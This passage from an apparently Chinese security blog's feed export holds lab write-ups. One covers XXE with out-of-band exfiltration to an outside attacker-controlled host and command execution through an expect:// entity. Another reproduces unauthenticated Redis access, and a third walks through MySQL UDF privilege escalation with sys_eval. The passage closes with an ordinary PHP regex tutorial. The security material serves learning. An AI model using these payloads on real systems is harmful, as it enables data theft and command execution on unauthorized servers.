<td><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a></td>
<td>本地搭建</td>
</tr>
</tbody></table>
<ol>
<li><p>在攻击机建立<code>php</code>文件接收数据 </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// 文件名称：get.php</span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">file_put_contents</span>(&#x27;<span class="attr">xxe_data.txt</span>&#x27;, $<span class="attr">_GET</span>[&#x27;<span class="attr">xxe_local</span>&#x27;]);</span></span><br><span class="line"><span class="tag">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在攻击机建立<code>xml</code>文件用于给受害机引入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// 文件名称：2.xml</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">param1</span> <span class="meta-string">&quot;&lt;!ENTITY exfil SYSTEM &#x27;http://test.hzktester.top/XXE/get.php?xxe_local=%data;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>对<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1:80/sqli-labs/Less-1/?id=1</a>进行普通注入即可<br>例如：<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1:80/sqli-labs/Less-1/?id=1</a><a href="http://127.0.0.1/test/test_sql.php?id=1%27">‘</a> and ‘1’=’1<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1:80/sqli-labs/Less-1/?id=1</a><a href="http://127.0.0.1/test/test_sql.php?id=1%27">‘</a> and ‘1’=’2</p>
</blockquote>
</li>
<li><p>受害机运行<code>payload</code>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">sp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://test.hzktester.top/XXE/2.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;exfil;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111906.png" alt="tp2020111906.png"></p>
</li>
<li><p>执行完以后会把数据<code>base64</code>回传给<code>get.php</code>  。<code>get.php</code>会创建一个<code>xxe_data.txt</code>文件并且写入数据</p>
</li>
</ol>
<p><img src="https://qiniu.hzktester.top/tp2020111907.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020111908.png" alt="image.png"><br>解密返回的就是页面数据 然后不断修改<code>2.xml</code>进行注入即可</p>
<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><p>需要系统安装了<code>PECL</code>上的<code>Expect</code>拓展</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://ipconfig&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="感谢师傅的笔记："><a href="#感谢师傅的笔记：" class="headerlink" title="感谢师傅的笔记："></a>感谢师傅的笔记：</h2><p>都是抄他的！<br><a href="https://www.yuque.com/pmiaowu/web_security_1/vgbyxt">https://www.yuque.com/pmiaowu/web_security_1/vgbyxt</a></p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>Radis未授权访问漏洞复现</title>
    <url>/posts/b70654.html</url>
    <content><![CDATA[<h2 id="漏洞特征："><a href="#漏洞特征：" class="headerlink" title="漏洞特征："></a>漏洞特征：</h2><ul>
<li><code>redis</code>绑定在 <code>0.0.0.0:6379</code>，且没有进行添加防火墙规则避免其他非信任来源<code>ip</code>访问等相关安全策略，直接暴露在公网；</li>
<li>没有设置密码认证（一般为空），可以免密码远程登录<code>redis</code>服务。 </li>
</ul>
<h2 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h2><ul>
<li>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行<code>flushall</code>来清空所有数据；</li>
<li>攻击者可通过<code>EVAL</code>执行<code>lua</code>代码，或通过数据备份功能往磁盘写入后门文件；</li>
<li>最严重的情况，如果<code>Redis</code>以<code>root</code>身份运行，黑客可以给<code>root</code>账户写入<code>SSH</code>公钥文件，直接通过<code>SSH</code>登录受害服务器</li>
</ul>
<h2 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h2><p>Redis 2.x，3.x，4.x，5.x</p>
<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>下载并安装测试用的<code>Redis</code>，本次采用的是<code>Centos7</code>镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111801.png" alt="image"><br>解压安装包，进入目录安装<code>radis</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-2.8.17</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111802.png" alt="image"><br>安装完成后，显示如下：<br><img src="https://qiniu.hzktester.top/tp2020111803.png" alt="image"><br><code>make</code>结束后，进入<code>src</code>目录，将<code>redis-server</code>和<code>redis-cli</code>拷贝到<code>/usr/bin</code>目录下（这样启动<code>redis-server</code>和<code>redis-cli</code>就不用每次都进入安装目录了）</p>
<p>返回目录<code>redis-2.8.17</code>，将<code>redis.conf</code>拷贝到<code>/etc/</code>目录下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cp redis.conf /etc/</span><br></pre></td></tr></table></figure>
<p>使用<code>/etc/</code>目录下的<code>reids.conf</code>文件中的配置启动<code>redis</code>服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111804.png" alt="image"><br>服务启动成功，我们克隆这台虚拟机，一台作为攻击机，一台作为靶机<br>靶机ip为<code>192.168.3.130</code><br><img src="https://qiniu.hzktester.top/tp2020111805.png" alt="image"><br>攻击机ip为<code>192.168.3.137</code>：<br><img src="https://qiniu.hzktester.top/tp2020111806.png" alt="image"></p>
<h3 id="未授权访问复现"><a href="#未授权访问复现" class="headerlink" title="未授权访问复现"></a>未授权访问复现</h3><p>靶机启动<code>radis</code>服务：<br><img src="https://qiniu.hzktester.top/tp2020111804.png" alt="image"><br>使用<code>redis</code>客户端直接无账号成功登录<code>redis</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./redis-cli -h 192.168.3.130</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111807.png" alt="image"><br>从登录的结果可以看出该<code>redis</code>服务对公网开放，且未启用认证。</p>
<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p>利用姿势可以参考这篇文章，感谢师傅的好文章！<br><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Radis</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL UDF提权执行系统命令</title>
    <url>/posts/d83e4025.html</url>
    <content><![CDATA[<h2 id="什么是UDF库"><a href="#什么是UDF库" class="headerlink" title="什么是UDF库"></a>什么是UDF库</h2><p><code>UDF</code>即用户自定义函数。是通过添加新函数，对<code>MYSQL</code>的功能进行补充，就像使用本地<code>MYSQL</code>函数<code>user()</code>和<code>concat()</code>等。</p>
<h2 id="UDF提权步骤"><a href="#UDF提权步骤" class="headerlink" title="UDF提权步骤"></a>UDF提权步骤</h2><h3 id="查看secure-file-priv的值"><a href="#查看secure-file-priv的值" class="headerlink" title="查看secure_file_priv的值"></a>查看<strong>secure_file_priv的值</strong></h3><p><code>secure_file_priv</code> 是用来限制<code> load dumpfile</code>、<code>into  outfile</code>、<code>load_file()</code> 函数在哪个目录下拥有上传或者读取文件的权限：</p>
<p>使用命令<code>show global variables like &#39;secure%&#39;</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&#x27;secure%&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>当 <code>secure_file_priv</code> 的值为 <code>NULL </code>，表示限制 <code>mysqld </code>不允许导入|导出，此时无法提权</li>
<li>当 <code>secure_file_priv </code>的值为 <code>/tmp/</code> ，表示限制 <code>mysqld </code>的导入|导出只能发生在<code>/tmp/</code> 目录下，此时也无法提权</li>
<li>当 <code>secure_file_priv</code>的值没有具体值时，表示不对 <code>mysqld</code>的导入|导出做限制，此时可提权</li>
</ul>
<p><code>secure_file_priv</code>的值在<code>MySQL</code>数据库的安装目录的 <code>my.ini</code> 文件中配置：<br><img src="https://qiniu.hzktester.top/tp2020111501.png" alt="tp2020111501.png"></p>
<h3 id="查看系统架构以及plugin目录"><a href="#查看系统架构以及plugin目录" class="headerlink" title="查看系统架构以及plugin目录"></a><strong>查看系统架构以及plugin目录</strong></h3><p>首先，我们分别通过<code>@@ version_compile_os</code>和<code>@@ version_compile_machine</code>，来获取当前数据库及操作系统的架构情况。结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@version_compile_os, @@version_compile_machine;</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| @@version_compile_os | @@version_compile_machine |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| Win32                | AMD64                     |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">&#x27;%compile%&#x27;</span>;</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">| Variable_name           | Value |</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">| version_compile_machine | AMD64 |</span><br><span class="line">| version_compile_os      | Win32 |</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>从<code>MySQL 5.0.67</code>开始，<code>UDF</code>库必须包含在<code>plugin</code>文件夹中，我们可以使用<code>@@ plugin_dir</code>全局变量找到该目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@plugin_dir;</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| @@plugin_dir                              |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| C:\phpStudy\PHPTutorial\MySQL\lib\plugin\ |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">&#x27;plugin%&#x27;</span>;</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">| Variable_name | Value                                     |</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">| plugin_dir    | C:\phpStudy\PHPTutorial\MySQL\lib\plugin\ |</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>当 <code>MySQL&lt; 5.1</code> 版本时，将 .dll 文件导入到 <code>c:\windows</code> 或者 <code>c:\windows\system32</code> 目录下。</li>
<li>当 <code>MySQL&gt; 5.1 </code>版本时，将 .dll 文件导入到<code> MySQL Server 5.xx\lib\plugin</code> 目录下 (<code>lib\plugin</code>目录默认不存在，需自行创建)。<h3 id="将dll文件写入plugin目录-并且创建函数"><a href="#将dll文件写入plugin目录-并且创建函数" class="headerlink" title="将dll文件写入plugin目录,并且创建函数"></a><strong>将dll文件写入plugin目录,并且创建函数</strong></h3>我们将使用<code>lib_mysqludf_sys_32.dll</code>的<code>DLL</code>库，你可以在<code>Metasploit</code>框架中找到它。你可以使用基于系统架构的<code>UDF</code>库，它们在<code>Metasploit</code>的安装目录<code>/usr/share/metasploit-framework/data/exploits/mysql/</code>。<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">点击这里</a>查看下载：</li>
</ul>
<p>我这里做测试，就直接上传到目录中了：<br><img src="https://qiniu.hzktester.top/tp2020111502.png" alt="tp2020111502.png"><br>创建函数<code>sys_eval</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; create <span class="keyword">function</span> sys_eval returns string soname <span class="string">&#x27;lib_mysqludf_sys_32.dll&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>
<h3 id="使用系统命令"><a href="#使用系统命令" class="headerlink" title="使用系统命令"></a><strong>使用系统命令</strong></h3><p>在将 <code>udf.dll</code> 文件写入<code>plugin</code>目录后，我们就可以使用 <code>sys_eval</code>函数了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from mysql.func <span class="built_in">where</span> name = <span class="string">&#x27;sys_eval&#x27;</span>;	<span class="comment">#查看创建的sys_eval函数</span></span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">| name     | ret | dl                      | <span class="built_in">type</span>     |</span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">| sys_eval |   0 | lib_mysqludf_sys_32.dll | <span class="keyword">function</span> |</span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_eval(<span class="string">&#x27;whoami&#x27;</span>);	<span class="comment">#使用系统命令</span></span><br><span class="line">+---------------------------+</span><br><span class="line">| sys_eval(<span class="string">&#x27;whoami&#x27;</span>)        |</span><br><span class="line">+---------------------------+</span><br><span class="line">| 172_27_0_11\administrator |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.06 sec)</span><br></pre></td></tr></table></figure>
<p>如果得到了数据库的用户名和密码，并且可以远程连接的话，可以使用<code>MSF</code>里面的** <strong><code>exploit/multi/mysql/mysql_udf_payload</code></strong> **模块自动注入。</p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://blog.csdn.net/qq_36119192/article/details/84863268">https://blog.csdn.net/qq_36119192/article/details/84863268</a><br><a href="https://blog.csdn.net/wsnbbz/article/details/104802100">https://blog.csdn.net/wsnbbz/article/details/104802100</a><br><a href="https://www.freebuf.com/articles/system/163144.html">https://www.freebuf.com/articles/system/163144.html</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>UDF提权</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式，字符串的匹配与查找函数，数组切割</title>
    <url>/posts/c0ec548.html</url>
    <content><![CDATA[<h2 id="PHP中的正则表达式"><a href="#PHP中的正则表达式" class="headerlink" title="PHP中的正则表达式"></a>PHP中的正则表达式</h2><blockquote>
<p>在php中，有两套正则表达式函数库，两者功能相似、知识执行效率略有差异：</p>
</blockquote>
<ul>
<li><code>PCRE</code>库提供，使用<code>preg_</code>为前缀命名的函数</li>
<li><code>POSIX</code>扩展提供的。使用以<code>ereg_</code>为前缀命名的函数</li>
</ul>
<p><code>PCRE</code>来源于<code>Perl</code>语言，而Perl是对字符串操作功能最强大的语言之一，<code>PHP</code>的最初版本就是由<code>Perl</code>开发的产品。</p>
<p><code>PCRE</code>语法支持更多特性，比<code>POSIX</code>语法更强大。</p>
<h3 id="与Perl语言兼容的正则表达式处理函数"><a href="#与Perl语言兼容的正则表达式处理函数" class="headerlink" title="与Perl语言兼容的正则表达式处理函数"></a>与Perl语言兼容的正则表达式处理函数</h3><table>
<thead>
<tr>
<th align="center"><strong>函数名</strong></th>
<th><strong>功能描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>preg_match()</strong></td>
<td>进行正则表达式匹配</td>
</tr>
<tr>
<td align="center"><strong>preg_match_all()</strong></td>
<td>进行全局正则表达式匹配</td>
</tr>
<tr>
<td align="center"><strong>preg_replace()</strong></td>
<td>执行正则表达式的搜索和替换</td>
</tr>
<tr>
<td align="center"><strong>preg_split()</strong></td>
<td>用正则表达式分割字符串</td>
</tr>
<tr>
<td align="center"><strong>preg_grep()</strong></td>
<td>返回与模式匹配的数组单元</td>
</tr>
<tr>
<td align="center"><strong>preg_replace_callback</strong></td>
<td>用回调函数执行正则表达式的搜索和替换</td>
</tr>
</tbody></table>
<h2 id="正则表达式语法规则"><a href="#正则表达式语法规则" class="headerlink" title="正则表达式语法规则"></a>正则表达式语法规则</h2><p>正则表达式作为一个匹配的模板，是由原子（普通字符，例如字符a到z）、特殊字符（元字符，例如*、+和？等）、以及模式修正符三部分组成的匹配模板。</p>
<h3 id="定界符"><a href="#定界符" class="headerlink" title="定界符"></a>定界符</h3><p>在程序语言中，使用与<code>Perl</code>兼容的正则表达式，通常都需要将模式表达式放入定界符之间，如<code>/</code>。</p>
<p>作为定界符常使用反斜线<code>/</code>，如<code>/apple/</code>。用户只要把需要匹配的模式内容放入定界符之间即可。作为定界的字符也不仅仅局限于<code>/</code>。除了字母、数字和斜线<code>\</code>以外的任何字符都可以作为定界符，像  <code>#</code>、<code>|</code>、<code>! </code>等都可以的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/&lt;\/\w+&gt;/						--使用反斜线作为定界符合法</span><br><span class="line">|(\d&#123;3&#125;)-\d+|Sm 		--使用竖线”|”作为定界符合法</span><br><span class="line">!^(?i)php[34]!			--使用竖线”!”作为定界符合法</span><br><span class="line">&#123;^\s+(\s+)?$&#125;	 			--使用竖线”&#125;”作为定界符合法</span><br><span class="line">/href=‘(.*)’	 			--非法定界符，缺少结束定界符</span><br><span class="line">1-\d3-\d3-\d4|	 		--非法定界符，缺少定界符</span><br></pre></td></tr></table></figure>
<h3 id="原子"><a href="#原子" class="headerlink" title="原子"></a>原子</h3><p>原子是正则表达式的最基本的组成单元，而且在每个模式中最少要少包含一个原子。原子是由所有那些未显示指定为元字符的打印和非打印字符组成，具体分为5类。</p>
<ul>
<li>普通字符作为原子： 如 <code>a~z</code>、<code>A~Z</code>、<code>0~9</code> 等</li>
<li>一些特殊字符和转义后元字符作为原子：所有标点符号，但语句特殊意义的符号需要转义后才可作为原子，如：<code>\” \’ \* \+ \? \.</code> 等</li>
<li>一些非打印字符作为原子： 如：<code>\f \n  \r \t \v \cx</code></li>
<li>使用“通用字符类型”作为原子：如：<code>\d \D \w \W \s \S</code>。</li>
<li>自定义原子表<code>([])</code>作为原子：如：<code>/[apj]sp/</code>、<code>/[^apj]sp/</code><h4 id="正则表达式中常用的非打印字符"><a href="#正则表达式中常用的非打印字符" class="headerlink" title="正则表达式中常用的非打印字符"></a>正则表达式中常用的非打印字符</h4></li>
</ul>
<table>
<thead>
<tr>
<th><strong>原子字符</strong></th>
<th><strong>含义描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>\cx</strong></td>
<td>匹配由x指明的控制字符。如\cM匹配一个Control-M或回车符。x的值必须为A<del>Z或a</del>z之一。</td>
</tr>
<tr>
<td><strong>\f</strong></td>
<td>匹配一个换页符。等价于   \x0c或\cL</td>
</tr>
<tr>
<td><strong>\n</strong></td>
<td>匹配一个换行符。等价于   \x0a或\cJ</td>
</tr>
<tr>
<td><strong>\r</strong></td>
<td>匹配一个回车符。等价于   \x0d或\cM</td>
</tr>
<tr>
<td><strong>\t</strong></td>
<td>匹配一个制表符。等价于   \x09或\cI</td>
</tr>
<tr>
<td><strong>\v</strong></td>
<td>匹配一个垂直制表符。等价于   \x0b或\cK</td>
</tr>
</tbody></table>
<h4 id="正则表达式中常用的“通用字符类型”"><a href="#正则表达式中常用的“通用字符类型”" class="headerlink" title="正则表达式中常用的“通用字符类型”"></a>正则表达式中常用的“通用字符类型”</h4><table>
<thead>
<tr>
<th><strong>原子字符</strong></th>
<th><strong>含义描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>\d</strong></td>
<td>匹配任意一个十进制数字，等价于[0-9]</td>
</tr>
<tr>
<td><strong>\D</strong></td>
<td>匹配任意一个除十进制数字以外的字符，等价于[^0-9]</td>
</tr>
<tr>
<td><strong>\s</strong></td>
<td>匹配任意一个空白符，等价于[\f\n\r\t\v]</td>
</tr>
<tr>
<td><strong>\S</strong></td>
<td>匹配除空白符以外任何字符，等价于[^\f\n\r\t\v]</td>
</tr>
<tr>
<td><strong>\w</strong></td>
<td>匹配任意一个数字、字母或下画线，等价于[0-9a-zA-Z_]</td>
</tr>
<tr>
<td><strong>\W</strong></td>
<td>匹配一个除数字、字母或下画线以外的任意一个字符，等价于[^0-9a-zA-Z_]</td>
</tr>
</tbody></table>
<h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><table>
<thead>
<tr>
<th><strong>元字符</strong></th>
<th><strong>含义描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>*****</td>
<td>匹配0次、1次或多次其前的原子</td>
</tr>
<tr>
<td><strong>+</strong></td>
<td>匹配1次或多次其前的原子</td>
</tr>
<tr>
<td><strong>？</strong></td>
<td>匹配0次或1次其前的原子</td>
</tr>
<tr>
<td><strong>.</strong></td>
<td>匹配除了换行符外的任意一个字符</td>
</tr>
<tr>
<td>**</td>
<td>**</td>
</tr>
<tr>
<td><strong>{n}</strong></td>
<td>表示其前面的原子恰好出现n次</td>
</tr>
<tr>
<td><strong>{n,}</strong></td>
<td>表示其前面的原子出现不小于n次</td>
</tr>
<tr>
<td><strong>{n,m}</strong></td>
<td>表示其前面的原子至少出现n次，最多出现m次</td>
</tr>
<tr>
<td><strong>^或\A</strong></td>
<td>匹配输入字符串的开始位置（或在多行模式下行的开头，即紧随一个换行符之后）</td>
</tr>
<tr>
<td><strong>$或\Z</strong></td>
<td>匹配输入字符串的结束位置（或在多行模式下行的结尾，即紧随一个换行符之前）</td>
</tr>
<tr>
<td><strong>\b</strong></td>
<td>匹配单词的边界</td>
</tr>
<tr>
<td><strong>\B</strong></td>
<td>匹配除单词边界以外的部分</td>
</tr>
<tr>
<td><strong>[]</strong></td>
<td>匹配方括号中指定的任意一个原子</td>
</tr>
<tr>
<td><strong>[^]</strong></td>
<td>匹配除方括号中的原子以外的任意一个字符</td>
</tr>
<tr>
<td><strong>( )</strong></td>
<td>匹配其整体为一个原子，即模式单元。可以理解为由多个单个原子组成的大原子</td>
</tr>
</tbody></table>
<h4 id="字符串边界限制"><a href="#字符串边界限制" class="headerlink" title="字符串边界限制"></a>字符串边界限制</h4><ul>
<li><code>^</code>：指定字符串的开始</li>
<li><code>&amp;</code>：指定支付的结束<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/^apple/&#x27;</span>;	//^匹配字符串开头为apple</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/apple$/&#x27;</span>;	//$匹配字符串结尾为apple</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/^apple$/&#x27;</span>;	//完全匹配字符串是apple</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/apple/&#x27;</span>;		//模糊匹配字符串含有apple</span><br><span class="line">preg_match(<span class="variable">$check</span>, <span class="string">&#x27;apple&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>);	//输出array(1) &#123; [0]=&gt; string(5) <span class="string">&quot;apple&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
<h4 id="单词边界限制"><a href="#单词边界限制" class="headerlink" title="单词边界限制"></a>单词边界限制</h4><blockquote>
<p>在使用各种编辑软件的查找功能时，可以通过选择“按单词查找”获得更准确的结果。正则表达式中也提供类似的功能。</p>
</blockquote>
</li>
</ul>
<p>例如：在字符串“This island is a beautiful land”中</p>
<ul>
<li><p><code>\b</code>：对单词的边界进行匹配</p>
</li>
<li><p><code>\B</code>：对除单词边界以外的部分进行匹配</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/\bis\b/&#x27;</span>;	//完全匹配单词is</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/\bis/&#x27;</span>;		//匹配单词is开头的</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/\Bis\B/&#x27;</span>;	//不与单词的左、右边界匹配，只匹配单词的内部。</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/\Bis/&#x27;</span>;		//匹配非is开头的单词</span><br><span class="line">preg_match_all(<span class="variable">$check</span>, <span class="string">&#x27;This island is a beautiful land&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure>
<h4 id="重复匹配"><a href="#重复匹配" class="headerlink" title="重复匹配"></a>重复匹配</h4><blockquote>
<p>正则表达式中有一些用于重复匹配某些原子的元字符：“?”、“*”、“+”。他们主要的区别是重复匹配的次数不同。</p>
</blockquote>
</li>
<li><p><code>?</code>：表示0次或1次匹配紧接在其前的原子</p>
</li>
<li><p><code>*</code>：表示0次、1次或多次匹配紧接在其前的原子</p>
</li>
<li><p><code>+</code>：表示1次或多次匹配紧接在其前的原子</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/Th?is/&#x27;</span>;		//匹配Tis,This</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/Th*is/&#x27;</span>;		//匹配Tis,This,Thhis等</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/Th+is/&#x27;</span>;		//匹配This,Thhis等</span><br><span class="line">preg_match(<span class="variable">$check</span>, <span class="string">&#x27;This&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&#123;&#125;</code>：准确的指定原子重复的次数，指定匹配所匹配的原子出现的次数</p>
<ul>
<li><code>&#123;m&#125;</code>：表示其前原子恰好出现m次</li>
<li><code>&#123;m,n&#125;</code>：表示其前原子至少出现m次，至多出现n次</li>
<li><code>&#123;m,&#125;</code>：表示其前原子出现不少于m次<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/This&#123;1&#125;/&#x27;</span>;		//匹配This</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/This&#123;1,2&#125;/&#x27;</span>;		//匹配This或Thiss</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/This&#123;1,&#125;/&#x27;</span>;		//匹配This...</span><br><span class="line">preg_match(<span class="variable">$check</span>, <span class="string">&#x27;Thissss&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure>
<h4 id="任何一个字符"><a href="#任何一个字符" class="headerlink" title="任何一个字符"></a>任何一个字符</h4></li>
</ul>
</li>
